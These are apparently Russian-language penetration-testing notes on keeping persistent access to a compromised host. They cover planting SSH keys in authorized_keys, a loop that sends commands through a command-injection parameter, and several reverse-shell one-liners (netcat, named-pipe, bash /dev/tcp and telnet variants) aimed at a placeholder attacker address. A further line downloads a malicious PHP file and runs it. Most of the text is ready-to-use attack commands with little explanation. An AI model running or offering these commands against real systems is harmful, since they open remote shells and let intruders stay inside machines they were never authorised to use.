# Перманентный доступ

* Аутентификационые данные: добавление своего пользователя, или использование не используемого
* Бинарные бекедоры: закинутые на систему патченые бинарнки
* Бекдор на уровне ядра ОС: сложный способ, но самый скрытный
* web-бекдор — попадание на систему под пользователем под которым запущено веб приложение.

## auth 

`ssh -i privkey user@target`

ключи:

* приватный — /home/user/.ssh/id.(rsa|dsa)
* публичный — /home/user/.ssh/id.(rsa|dsa.pub)

Нужно закинуть публичный ключ на сервис на который нужно ходить.
Файл в домашней директори .ssh/authorized_keys


## Организация канала управления

* web-уязвимость, простейщий случай:
```
while (true); do read cmd; wget -O - http://target/vuln?$cmd; done
```

`vuln` — параметр уязвимый для command imjection  

Варианты создания обратного соединения с возможностью выполнения кода:

* `nc <attack_ip> <port> -e /bin/bush`

* `mknod backpipe p; nc <attack_ip> <port> 0<backpipe | /bin/bash 1>backpipe`

* `/bin/bash -i > /dev/tcp/ <attack_ip> / <port> 0<&1 2>&1`

* `mknod backpipe p; telnet <attack_ip> <port> 0<backpipe | /bin/bash 1>backpipe`

* `telnet <attack_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>`

* `wget -O /tmp/bd.php <url_to_mailcious_file> && php -f /tmp/bd.php`
